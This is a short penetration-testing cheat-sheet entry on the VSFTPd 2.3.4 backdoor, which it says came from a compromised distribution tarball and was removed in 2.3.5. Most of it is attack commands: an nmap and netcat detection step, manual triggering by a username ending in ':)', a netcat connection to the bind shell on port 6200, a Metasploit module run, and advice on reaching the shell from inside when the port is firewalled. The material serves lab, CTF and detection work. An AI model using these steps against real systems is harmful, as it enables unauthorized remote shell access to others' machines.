# VSFTPd 2.3.4 Backdoor

VSFTPd 2.3.4 (uploaded to SourceForge July 2011) contains a backdoor: append `:)` to the username during login to open a bind shell on port 6200.

**Detect:**
```bash
nmap -p 21 --script ftp-vsftpd-backdoor <TARGET>
# or banner check:
nc <TARGET> 21   # look for "vsftpd 2.3.4"
```

**Trigger manually:**
```bash
ftp <TARGET>
# Username: user:)
# Password: anything
# Port 6200 opens on target
nc <TARGET> 6200
```

**Metasploit:**
```bash
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS <TARGET>
run
```

**If port 6200 is firewalled**, try triggering from inside (via RCE or another service) then connecting internally.

**Note:** This backdoor was removed in 2.3.5 — it was introduced via a compromised distribution tarball, not the source code.
